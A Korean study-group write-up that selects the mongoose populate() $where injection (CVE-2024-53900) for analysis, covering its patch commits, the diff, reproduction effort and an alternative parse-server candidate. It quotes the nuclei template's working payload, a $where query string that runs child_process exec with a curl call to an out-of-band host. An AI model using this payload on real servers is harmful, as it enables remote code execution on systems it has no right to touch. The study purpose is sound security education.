# W12 · NoSQL injection — mongoose (GHSA-m7xq-9374-9rvx)

- CVE / 공개일 / 심각도 / 패키지·영향 버전: CVE-2024-53900 / 2024-12-02 / high (CVSS 3.1 9.8, nuclei 템플릿 자체 평가는 9.1) / mongoose (npm) 5.13.23 미만, 6.13.5 미만, 7.8.3 미만, 8.8.3 미만
- 패치 커밋: https://github.com/Automattic/mongoose/commit/33679bcf8ca43d74e3e8ecd4cc224826772d805b (본 수정) + https://github.com/Automattic/mongoose/commit/c9e86bff7eef477da75a29af62a06d41a835a156 (같은 릴리스에 포함된 `assignVals.js` 정리, 보안 로직 자체와는 무관)
- diff 규모: +20/-5, 2파일 (`lib/helpers/populate/getModelsMapForPopulate.js` +19/-0, `lib/helpers/populate/assignVals.js` +1/-5)

## 왜 이 주차에 적절한가
advisory는 CWE-89(SQL Injection)로 분류돼 있지만 실제로는 MongoDB 쿼리 연산자 `$where`(임의 JS를 서버 측에서 실행시키는 연산자) 인젝션이다. 취약 버전에서는 `.populate({ path, match })`의 `match` 객체가 그대로 최종 MongoDB 쿼리에 병합되어, `match`에 사용자 입력이 흘러 들어가면 `{ $where: '...' }` 형태의 페이로드가 검증 없이 실행됐다. 패치는 `getModelsMapForPopulate.js`의 일반 populate 경로와 virtual populate 경로 두 곳에 각각 `match.$where`(또는 배열의 각 원소의 `$where`) 존재 여부를 검사해 `MongooseError('Cannot use $where filter with populate() match')`를 던지는 가드를 추가했다 — PortSwigger NoSQL injection 랩 중 "쿼리 연산자를 이용한 인증 우회/서버사이드 JS 실행" 계열 개념과 직접 대응한다. `assignVals.js`의 `noop` 함수를 인라인 화살표 함수로 바꾼 부분은 같은 릴리스에 묶인 리팩터링일 뿐 보안 로직과는 무관해, 발표 시 "diff 전체가 보안 수정은 아니다"를 짚어줘야 한다.

## 취약점 한 줄 요약
클라이언트가 컨트롤 가능한 `populate()`의 `match` 옵션 값이 검증 없이 MongoDB 쿼리 조건으로 병합되어 `$where` 연산자를 통해 서버 측 JavaScript(`global.process.mainModule.constructor._load('child_process').exec(...)`)까지 실행되는 싱크에 도달한다.

## 난이도·재현 메모
- diff 난이도(초심자 기준): `getModelsMapForPopulate.js` 훅은 이해 가능하지만, `match`가 populate 파이프라인 어디서 만들어지고 왜 사용자 입력이 거기 들어가는지는 Mongoose 내부 populate 로직을 모르면 diff만으로 파악하기 어렵다. `assignVals.js`의 무관한 리팩터링이 같은 커밋 세트에 섞여 있어 "이 줄도 보안 수정인가"라는 혼동을 유발하기 쉽다 — 발표 자료에 명확히 구분 필요.
- 재현 환경 구축 부담: Node.js + MongoDB만 있으면 되고, mongoose 특정 구버전 설치 후 populate match에 `$where` 페이로드를 직접 넣는 간단한 스크립트로 재현 가능해 스터디 환경에서 부담이 적다.
- nuclei 템플릿 유무 / PoC 공개 여부: `http/cves/2024/CVE-2024-53900.yaml` 템플릿 존재 확인(`gh api search/code`로 2건 검색, 그중 CVE-2024-53900.yaml이 본 템플릿, 나머지 CVE-2025-23061.yaml은 동일 검색어에 걸린 별개 템플릿). 템플릿 페이로드는 `view[path]=author&view[match][$where]=global.process.mainModule.constructor._load('child_process').exec('curl {interactsh-url}')` 형태로 OOB(interactsh) 기반 RCE 확인 방식을 사용한다. 이번 스터디에서 조사한 20여 건 후보 중 nuclei 템플릿이 존재하는 유일한 케이스.

## 대안 후보
- pip 생태계에는 정통 MongoDB NoSQLi 소규모 후보가 사실상 없음(langgraph-checkpoint-mongodb 등은 커밋 링크 미제공) — 그래서 npm(mongoose)으로 축을 옮긴 것이 이번 주 유일한 실사용 가능 후보.
- GHSA-vgjh-hmwf-c588 / CVE-2026-30941 (parse-server, npm, +6/-1 2파일): 비밀번호 재설정 토큰 조회 로직에서 연산자 인젝션이 발생해 인증 우회로 이어지는 시나리오라 임팩트 스토리텔링은 강하지만, mongoose 건과 달리 nuclei 템플릿·공개 PoC가 확인되지 않아 재현 난이도 검증이 더 필요하다.
